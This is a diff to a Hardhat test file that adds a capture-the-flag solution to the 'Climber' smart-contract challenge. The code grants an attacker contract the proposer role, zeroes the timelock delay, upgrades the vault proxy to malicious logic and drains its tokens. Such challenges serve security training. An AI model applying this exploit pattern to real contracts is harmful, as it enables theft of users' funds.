@@ -21,8 +21,9 @@ describe('[Challenge] Climber', function () {
         // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
         vault = await upgrades.deployProxy(
             await ethers.getContractFactory('ClimberVault', deployer),
-            [ deployer.address, proposer.address, sweeper.address ],
-            { kind: 'uups' }
+            [deployer.address, proposer.address, sweeper.address], {
+                kind: 'uups'
+            }
         );
 
         expect(await vault.getSweeper()).to.eq(sweeper.address);
@@ -56,8 +57,72 @@ describe('[Challenge] Climber', function () {
         await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
     });
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE */
+
+        // Connect to existing contracts as player
+        const attackVault = vault.connect(player);
+        const attackTimeLock = timelock.connect(player);
+        const attackToken = token.connect(player);
+
+        // Deploy our attacking contract
+        const AttackContractFactory = await ethers.getContractFactory("AttackTimelock", player);
+        const attackContract = await AttackContractFactory.deploy(
+            attackVault.address,
+            attackTimeLock.address,
+            attackToken.address,
+            player.address);
+
+        // Deploy contract that will act as new logic contract for vault
+        const MalciousVaultFactory = await ethers.getContractFactory("AttackVault", player);
+        const maliciousVaultContract = await MalciousVaultFactory.deploy();
+
+        const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));
+
+        // Helper function to create ABIs
+        const createInterface = (signature, methodName, arguments) => {
+            const ABI = signature;
+            const IFace = new ethers.utils.Interface(ABI);
+            const ABIData = IFace.encodeFunctionData(methodName, arguments);
+            return ABIData;
+        }
+
+        // Set attacker contract as proposer for timelock
+        const setupRoleABI = ["function grantRole(bytes32 role, address account)"];
+        const grantRoleData = createInterface(setupRoleABI, "grantRole", [PROPOSER_ROLE, attackContract.address]);
+
+        // Update delay to 0
+        const updateDelayABI = ["function updateDelay(uint64 newDelay)"];
+        const updateDelayData = createInterface(updateDelayABI, "updateDelay", [0]);
+
+        // Call to the vault to upgrade to attacker controlled contract logic
+        const upgradeABI = ["function upgradeTo(address newImplementation)"];
+        const upgradeData = createInterface(upgradeABI, "upgradeTo", [maliciousVaultContract.address]);
+
+        // Call Attacking Contract to schedule these actions and sweep funds
+        const exploitABI = ["function exploit()"];
+        const exploitData = createInterface(exploitABI, "exploit", undefined);
+
+        const toAddress = [attackTimeLock.address, attackTimeLock.address, attackVault.address, attackContract.address];
+        const data = [grantRoleData, updateDelayData, upgradeData, exploitData]
+
+        // Set our 4 calls to attacking contract
+        await attackContract.setScheduleData(
+            toAddress,
+            data
+        );
+
+        // execute the 4 calls
+        await attackTimeLock.execute(
+            toAddress,
+            Array(data.length).fill(0),
+            data,
+            ethers.utils.hexZeroPad("0x00", 32)
+        );
+
+        // Withdraw our funds from attacking contract
+        await attackContract.withdraw();
+
     });
 
     after(async function () {
